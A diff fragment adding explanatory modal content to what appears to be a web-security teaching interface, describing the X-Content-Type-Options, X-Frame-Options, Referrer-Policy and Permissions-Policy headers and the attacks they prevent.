+                    <p>Prevent browsers from MIME-sniffing responses.</p>
+                    <div class="modal-code-block">
+                        <pre class="modal-code"><code>X-Content-Type-Options: nosniff
+
+// Without this, browsers might:
+// - Treat image as HTML (if it contains HTML)
+// - Execute JavaScript from non-JS content types
+// - Enable XSS via content type confusion</code></pre>
+                    </div>
+                `
+            },
+            'header-xfo': {
+                title: 'X-Frame-Options',
+                body: `
+                    <p>Prevent your page from being embedded in iframes.</p>
+                    <div class="modal-code-block">
+                        <pre class="modal-code"><code>X-Frame-Options: DENY           // Never allow framing
+X-Frame-Options: SAMEORIGIN     // Only same origin
+
+// Prevents clickjacking:
+// Attacker overlays invisible iframe of your site
+// User clicks attacker's button
+// Actually clicking your "Delete Account" button</code></pre>
+                    </div>
+                `
+            },
+            'header-referrer': {
+                title: 'Referrer-Policy',
+                body: `
+                    <p>Control how much referrer information is sent.</p>
+                    <div class="modal-code-block">
+                        <pre class="modal-code"><code>Referrer-Policy: strict-origin-when-cross-origin
+
+// Same-origin: full URL sent
+// Cross-origin HTTPS→HTTPS: origin only
+// HTTPS→HTTP: nothing sent
+
+// Prevents leaking:
+// - URL paths with sensitive data
+// - Query parameters with tokens
+// - Internal URL structure</code></pre>
+                    </div>
+                `
+            },
+            'header-permissions': {
+                title: 'Permissions-Policy',
+                body: `
+                    <p>Disable browser features you don't need.</p>
+                    <div class="modal-code-block">
+                        <pre class="modal-code"><code>Permissions-Policy: geolocation=(), camera=(), microphone=()
+
+// Disable features completely:
+// - geolocation=() — no location access
+// - camera=() — no camera access
+// - payment=() — no Payment API
+
+// If XSS occurs, attacker can't:
+// - Access user's location
+// - Activate camera/microphone
+// - Use payment APIs</code></pre>
+                    </div>
+                `
             }
         };
     }
